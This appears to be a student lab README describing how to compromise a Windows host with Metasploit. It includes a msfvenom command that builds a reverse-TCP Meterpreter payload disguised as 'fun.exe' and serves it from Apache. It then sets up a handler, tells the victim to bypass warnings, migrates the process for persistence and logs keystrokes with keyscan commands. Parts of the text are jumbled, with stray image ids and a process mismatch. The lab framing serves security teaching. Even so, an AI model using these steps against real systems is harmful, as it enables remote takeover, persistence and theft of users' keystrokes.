# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig 322251922-6e11e35c-4c2c-4b7f-b903-58b1582a464b
![image](https://github.com/Naadira/Compromising-windows-using-Metasploit/assets/128135126/104eab8b-3fb7-48fe-ade0-31243e195d81)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe 

![image](https://github.com/Naadira/Compromising-windows-using-Metasploit/assets/128135126/0df0e815-1019-49e3-996b-43e70ba70201)

copy the fun.exe into the apache /var/www/html folder
![image](https://github.com/Naadira/Compromising-windows-using-Metasploit/assets/128135126/77100a12-2427-4562-906a-ea2cf6a3e18d)

Start apache server sudo systemctl apache2 start 
![image](https://github.com/Naadira/Compromising-windows-using-Metasploit/assets/128135126/0c72e2bc-2ed6-4f58-82d5-6abf3cc86165)

Check the status of apache2
![image](https://github.com/Naadira/Compromising-windows-using-Metasploit/assets/128135126/0cdc4dbc-0096-421c-9871-7c748d834acf)

Invoke msfconsole: Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit ![326166316-27254eeb-6e3e-4ca0-938f-fa39732b8b8a] On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads. (https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/131433133/6a71f1a6-830e-4160-8355-3cb87ec0e619)
![image](https://github.com/Naadira/Compromising-windows-using-Metasploit/assets/128135126/d7513f4b-c94d-4f1f-ba56-23812f92ccfa)

Bypass any warning boxes, double-click the file, and allow it to run. On kali give the command exploit
![image](https://github.com/Naadira/Compromising-windows-using-Metasploit/assets/128135126/6f84f7dc-4cf9-4d05-9fbe-de8fd2ab8269)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156 The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
![image](https://github.com/Naadira/Compromising-windows-using-Metasploit/assets/128135126/187cae8f-a756-4f56-a659-80340356c26c)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name
![image](https://github.com/Naadira/Compromising-windows-using-Metasploit/assets/128135126/f67aa38d-536c-436d-90f7-2cada74bbdbc)

keyscan_dump Shows the keystrokes captured so far
![image](https://github.com/Naadira/Compromising-windows-using-Metasploit/assets/128135126/360ef81c-76fc-44e8-82f0-f6bf264b8bf4)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
